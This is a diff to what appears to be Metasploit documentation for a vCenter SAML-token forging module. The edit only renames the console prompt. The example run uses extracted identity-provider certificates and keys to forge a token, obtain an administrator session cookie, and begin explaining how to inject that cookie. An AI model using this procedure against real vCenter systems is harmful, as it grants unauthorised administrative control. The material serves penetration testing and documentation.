@@ -187,18 +187,18 @@ You should now have `idp.pem`, `idp.key`, and `vmca.pem` in your working directo
 Example run against vCenter appliance version 7.0 Update 3d:
 
 ```
-msf6 > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
+msf > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
 RHOSTS => 192.168.100.110
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
 VHOST => vcenter.cesium137.io
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
 VC_IDP_CERT => ~/idp.pem
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
 VC_IDP_KEY => ~/idp.key
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_VMCA_CERT ~/vmca.pem
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_VMCA_CERT ~/vmca.pem
 VC_VMCA_CERT => ~/vmca.pem
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) > run
 [*] Running module against 192.168.100.110
 
 [+] Validated vCenter Single Sign-On IdP trusted certificate chain
@@ -210,7 +210,7 @@ msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
 [+] Got valid administrator session token!
 [+]     JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1; Path=/ui
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) >
+msf auxiliary(admin/vmware/vcenter_forge_saml_token) >
 ```
 ### Using the Session Cookie
 Inject the acquired session cookie using the method of your choice. The cookie name must be
